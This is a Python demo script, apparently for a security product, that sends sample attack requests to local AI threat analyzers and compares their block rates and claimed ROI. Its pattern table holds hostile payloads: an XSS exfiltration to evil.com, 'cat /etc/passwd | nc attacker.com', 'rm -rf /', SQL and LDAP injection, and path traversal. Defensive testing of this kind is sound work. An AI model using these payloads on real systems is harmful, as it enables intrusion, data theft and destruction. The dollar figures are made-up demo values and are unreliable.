#!/usr/bin/env python3
"""
Kong Guard AI - Attack Comparison Engine
Orchestrates three-tier attack testing for comprehensive demos
"""

import asyncio
import json
import logging
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any
from typing import Optional

import httpx

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ProtectionTier(Enum):
    UNPROTECTED = "unprotected"
    CLOUD_AI = "cloud"
    LOCAL_AI = "local"


@dataclass
class AttackResult:
    tier: ProtectionTier
    attack_type: str
    threat_score: float
    threat_type: str
    confidence: float
    reasoning: str
    recommended_action: str
    processing_time: float
    blocked: bool
    vulnerable: bool = False


@dataclass
class AttackPattern:
    name: str
    attack_type: str
    method: str
    path: str
    query: str
    body: str
    description: str
    financial_impact: int = 0
    industry: str = "general"


class AttackComparisonEngine:
    def __init__(self):
        self.services = {
            ProtectionTier.UNPROTECTED: "http://localhost:8000",
            ProtectionTier.CLOUD_AI: "http://localhost:18002",
            ProtectionTier.LOCAL_AI: "http://localhost:18003",
        }

        self.attack_patterns = {
            "sql_injection": AttackPattern(
                name="SQL Injection",
                attack_type="sql_injection",
                method="GET",
                path="/api/users",
                query="id=1' OR '1'='1; DROP TABLE users;--",
                body="SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--",
                description="Advanced SQL injection targeting user authentication and data extraction",
                financial_impact=2500000,
                industry="financial",
            ),
            "xss_attack": AttackPattern(
                name="Cross-Site Scripting",
                attack_type="xss",
                method="POST",
                path="/comment",
                query="",
                body="<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))</script>",
                description="XSS attack attempting to steal sensitive user data",
                financial_impact=1200000,
                industry="retail",
            ),
            "command_injection": AttackPattern(
                name="Command Injection",
                attack_type="command_injection",
                method="POST",
                path="/api/ping",
                query="ping=127.0.0.1; rm -rf / #",
                body="; cat /etc/passwd | nc attacker.com 4444 &",
                description="System command injection for remote access",
                financial_impact=5000000,
                industry="government",
            ),
            "path_traversal": AttackPattern(
                name="Path Traversal",
                attack_type="path_traversal",
                method="GET",
                path="/download",
                query="file=../../../../etc/passwd",
                body="",
                description="Directory traversal to access sensitive system files",
                financial_impact=800000,
                industry="healthcare",
            ),
            "business_logic": AttackPattern(
                name="Business Logic Attack",
                attack_type="business_logic",
                method="POST",
                path="/api/transfer",
                query="amount=-999999&to_account=attacker",
                body='{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}',
                description="Financial fraud through negative amount exploitation",
                financial_impact=50000000,
                industry="financial",
            ),
            "ransomware_c2": AttackPattern(
                name="Ransomware C&C",
                attack_type="ransomware",
                method="POST",
                path="/api/callback",
                query="host_id=VICTIM-001&status=encrypted",
                body='{"victim_id": "ENTERPRISE-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "10000000"}',
                description="Ransomware command & control communication",
                financial_impact=10000000,
                industry="energy",
            ),
            "ldap_injection": AttackPattern(
                name="LDAP Injection",
                attack_type="ldap_injection",
                method="POST",
                path="/auth/ldap",
                query="user=admin')(&(password=*)",
                body="admin')(&(password=*)(|(objectClass=*)))",
                description="LDAP injection for authentication bypass",
                financial_impact=3000000,
                industry="government",
            ),
            "supply_chain": AttackPattern(
                name="Supply Chain Attack",
                attack_type="supply_chain",
                method="POST",
                path="/api/install",
                query="package=@malicious/backdoor&version=latest",
                body="npm install compromised-package-with-crypto-miner",
                description="Malicious package injection in supply chain",
                financial_impact=15000000,
                industry="technology",
            ),
        }

        self.results_history = []
        self.metrics = {tier: {"total": 0, "blocked": 0, "vulnerable": 0, "total_time": 0.0} for tier in ProtectionTier}

    async def check_service_health(self, tier: ProtectionTier) -> dict[str, Any]:
        """Check if a protection tier service is available"""
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                if tier == ProtectionTier.UNPROTECTED:
                    # For unprotected tier, just check basic connectivity
                    response = await client.get(f"{self.services[tier]}/status")
                    return {"available": response.status_code == 200, "status": "unprotected"}
                else:
                    response = await client.get(f"{self.services[tier]}/health")
                    if response.status_code == 200:
                        health_data = response.json()
                        return {
                            "available": True,
                            "status": health_data.get("status", "unknown"),
                            "details": health_data,
                        }
                    else:
                        return {"available": False, "status": "offline"}
        except Exception as e:
            logger.warning(f"Service {tier.value} health check failed: {e}")
            return {"available": False, "status": "error", "error": str(e)}

    async def test_attack_on_tier(self, pattern: AttackPattern, tier: ProtectionTier) -> AttackResult:
        """Test a single attack pattern against a specific protection tier"""
        start_time = time.time()

        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                if tier == ProtectionTier.UNPROTECTED:
                    # Simulate unprotected behavior - always allows through
                    await asyncio.sleep(0.002)  # 2ms delay
                    processing_time = time.time() - start_time

                    return AttackResult(
                        tier=tier,
                        attack_type=pattern.attack_type,
                        threat_score=0.0,
                        threat_type="none",
                        confidence=0.0,
                        reasoning="No protection - request passed through unchanged",
                        recommended_action="allow",
                        processing_time=processing_time,
                        blocked=False,
                        vulnerable=True,
                    )
                else:
                    # Test against AI service
                    request_data = {
                        "features": {
                            "method": pattern.method,
                            "path": pattern.path,
                            "client_ip": "203.0.113.100",
                            "user_agent": "ComparisonEngine/1.0",
                            "requests_per_minute": 10,
                            "content_length": len(pattern.body or pattern.query or ""),
                            "query_param_count": 1 if pattern.query else 0,
                            "header_count": 3,
                            "hour_of_day": 14,
                            "query": pattern.query,
                            "body": pattern.body,
                            "headers": {"Content-Type": "application/json"},
                        },
                        "context": {"previous_requests": 0, "failed_attempts": 0},
                    }

                    response = await client.post(f"{self.services[tier]}/analyze", json=request_data)

                    if response.status_code != 200:
                        raise Exception(f"HTTP {response.status_code}: {response.text}")

                    result_data = response.json()
                    processing_time = time.time() - start_time

                    # Determine if attack was blocked
                    threat_score = result_data.get("threat_score", 0.0)
                    blocked = threat_score >= 0.7 or result_data.get("recommended_action") == "block"

                    return AttackResult(
                        tier=tier,
                        attack_type=pattern.attack_type,
                        threat_score=threat_score,
                        threat_type=result_data.get("threat_type", "unknown"),
                        confidence=result_data.get("confidence", 0.0),
                        reasoning=result_data.get("reasoning", "AI analysis completed"),
                        recommended_action=result_data.get("recommended_action", "unknown"),
                        processing_time=processing_time,
                        blocked=blocked,
                    )

        except Exception as e:
            processing_time = time.time() - start_time
            logger.error(f"Attack test failed for {tier.value}: {e}")

            return AttackResult(
                tier=tier,
                attack_type=pattern.attack_type,
                threat_score=0.0,
                threat_type="error",
                confidence=0.0,
                reasoning=f"Test failed: {str(e)}",
                recommended_action="error",
                processing_time=processing_time,
                blocked=False,
            )

    async def compare_attack_across_tiers(self, attack_type: str) -> dict[ProtectionTier, AttackResult]:
        """Test a single attack type across all three protection tiers"""
        if attack_type not in self.attack_patterns:
            raise ValueError(f"Unknown attack type: {attack_type}")

        pattern = self.attack_patterns[attack_type]
        logger.info(f"Testing {pattern.name} across all tiers...")

        # Test all tiers in parallel for fair comparison
        tasks = []
        for tier in ProtectionTier:
            tasks.append(self.test_attack_on_tier(pattern, tier))

        results = await asyncio.gather(*tasks)

        # Update metrics
        for result in results:
            self.metrics[result.tier]["total"] += 1
            self.metrics[result.tier]["total_time"] += result.processing_time

            if result.blocked:
                self.metrics[result.tier]["blocked"] += 1
            elif result.vulnerable:
                self.metrics[result.tier]["vulnerable"] += 1

        # Store results
        comparison_result = {result.tier: result for result in results}
        self.results_history.append(
            {"timestamp": time.time(), "attack_type": attack_type, "pattern": pattern, "results": comparison_result}
        )

        return comparison_result

    async def run_comprehensive_comparison(
        self, attack_types: Optional[list[str]] = None
    ) -> dict[str, dict[ProtectionTier, AttackResult]]:
        """Run comprehensive comparison across multiple attack types"""
        if attack_types is None:
            attack_types = list(self.attack_patterns.keys())

        logger.info(f"Running comprehensive comparison for {len(attack_types)} attack types...")

        all_results = {}

        for attack_type in attack_types:
            try:
                results = await self.compare_attack_across_tiers(attack_type)
                all_results[attack_type] = results

                # Log summary
                unprotected = results[ProtectionTier.UNPROTECTED]
                cloud = results[ProtectionTier.CLOUD_AI]
                local = results[ProtectionTier.LOCAL_AI]

                logger.info(f"{self.attack_patterns[attack_type].name} Results:")
                logger.info(f"  🔓 Unprotected: {'VULNERABLE' if unprotected.vulnerable else 'SAFE'}")
                logger.info(
                    f"  ☁️ Cloud AI: {'BLOCKED' if cloud.blocked else 'ALLOWED'} (Score: {cloud.threat_score:.2f})"
                )
                logger.info(
                    f"  🏠 Local AI: {'BLOCKED' if local.blocked else 'ALLOWED'} (Score: {local.threat_score:.2f})"
                )

                # Small delay between attacks
                await asyncio.sleep(0.5)

            except Exception as e:
                logger.error(f"Failed to test {attack_type}: {e}")
                continue

        return all_results

    def generate_comparison_report(self) -> dict[str, Any]:
        """Generate detailed comparison report"""
        report = {
            "summary": {"total_attacks_tested": sum(m["total"] for m in self.metrics.values()), "attacks_by_tier": {}},
            "metrics": {},
            "effectiveness": {},
            "performance": {},
            "financial_impact": {},
        }

        # Calculate metrics for each tier
        for tier, data in self.metrics.items():
            total = data["total"]
            if total == 0:
                continue

            blocked_rate = (data["blocked"] / total) * 100
            vulnerable_rate = (data["vulnerable"] / total) * 100
            avg_response_time = data["total_time"] / total

            report["metrics"][tier.value] = {
                "total_tests": total,
                "blocked": data["blocked"],
                "vulnerable": data["vulnerable"],
                "blocked_rate": blocked_rate,
                "vulnerable_rate": vulnerable_rate,
                "average_response_time": avg_response_time,
            }

            report["summary"]["attacks_by_tier"][tier.value] = {
                "blocked": data["blocked"],
                "vulnerable": data["vulnerable"],
            }

        # Calculate effectiveness scores
        for tier in ProtectionTier:
            if tier.value in report["metrics"]:
                metrics = report["metrics"][tier.value]
                if tier == ProtectionTier.UNPROTECTED:
                    effectiveness_score = 0  # No protection
                else:
                    effectiveness_score = metrics["blocked_rate"]

                report["effectiveness"][tier.value] = {
                    "score": effectiveness_score,
                    "grade": self._get_effectiveness_grade(effectiveness_score),
                }

        # Calculate financial impact prevented
        total_prevented = 0
        for entry in self.results_history:
            pattern = entry["pattern"]
            results = entry["results"]

            # If cloud or local blocked but unprotected didn't, count as prevented
            cloud_blocked = results[ProtectionTier.CLOUD_AI].blocked
            local_blocked = results[ProtectionTier.LOCAL_AI].blocked
            unprotected_blocked = results[ProtectionTier.UNPROTECTED].blocked

            if (cloud_blocked or local_blocked) and not unprotected_blocked:
                total_prevented += pattern.financial_impact

        report["financial_impact"] = {
            "total_prevented": total_prevented,
            "average_per_attack": total_prevented / len(self.results_history) if self.results_history else 0,
            "roi_calculation": {
                "kong_guard_ai_cost_per_year": 50000,  # Estimated
                "financial_damage_prevented": total_prevented,
                "roi_multiplier": total_prevented / 50000 if total_prevented > 0 else 0,
            },
        }

        return report

    def _get_effectiveness_grade(self, score: float) -> str:
        """Convert effectiveness score to letter grade"""
        if score >= 95:
            return "A+"
        elif score >= 90:
            return "A"
        elif score >= 85:
            return "B+"
        elif score >= 80:
            return "B"
        elif score >= 75:
            return "C+"
        elif score >= 70:
            return "C"
        elif score >= 60:
            return "D"
        else:
            return "F"

    async def export_results(self, filename: str = "attack_comparison_results.json"):
        """Export all results to JSON file"""
        export_data = {
            "timestamp": time.time(),
            "metrics": self.metrics,
            "results_history": self.results_history,
            "report": self.generate_comparison_report(),
        }

        # Convert enum keys to strings for JSON serialization
        serializable_data = json.loads(json.dumps(export_data, default=str))

        with open(filename, "w") as f:
            json.dump(serializable_data, f, indent=2)

        logger.info(f"Results exported to {filename}")


async def main():
    """Main demonstration function"""
    engine = AttackComparisonEngine()

    print("🛡️ Kong Guard AI - Attack Comparison Engine")
    print("=" * 60)

    # Check service health
    print("🔍 Checking service health...")
    health_checks = {}
    for tier in ProtectionTier:
        health = await engine.check_service_health(tier)
        health_checks[tier] = health
        status = "✅" if health["available"] else "❌"
        print(f"  {status} {tier.value.upper()}: {health['status']}")

    print()

    # Run comprehensive comparison
    print("🎯 Running comprehensive attack comparison...")
    results = await engine.run_comprehensive_comparison()

    print()
    print("📊 COMPARISON SUMMARY")
    print("=" * 60)

    # Display results table
    print(f"{'Attack Type':<20} {'Unprotected':<12} {'Cloud AI':<12} {'Local AI':<12}")
    print("-" * 60)

    for attack_type, tier_results in results.items():
        pattern = engine.attack_patterns[attack_type]
        unprotected = "VULNERABLE" if tier_results[ProtectionTier.UNPROTECTED].vulnerable else "SAFE"
        cloud = "BLOCKED" if tier_results[ProtectionTier.CLOUD_AI].blocked else "ALLOWED"
        local = "BLOCKED" if tier_results[ProtectionTier.LOCAL_AI].blocked else "ALLOWED"

        print(f"{pattern.name:<20} {unprotected:<12} {cloud:<12} {local:<12}")

    # Generate and display report
    report = engine.generate_comparison_report()

    print()
    print("📈 EFFECTIVENESS ANALYSIS")
    print("=" * 60)

    for tier, effectiveness in report["effectiveness"].items():
        score = effectiveness["score"]
        grade = effectiveness["grade"]
        print(f"{tier.upper():<15}: {score:.1f}% (Grade: {grade})")

    print()
    print("💰 FINANCIAL IMPACT")
    print("=" * 60)
    financial = report["financial_impact"]
    print(f"Total Damage Prevented: ${financial['total_prevented']:,}")
    print(f"ROI Multiplier: {financial['roi_calculation']['roi_multiplier']:.1f}x")

    # Export results
    await engine.export_results()

    print()
    print("✅ Comparison complete! Results exported to attack_comparison_results.json")


if __name__ == "__main__":
    asyncio.run(main())
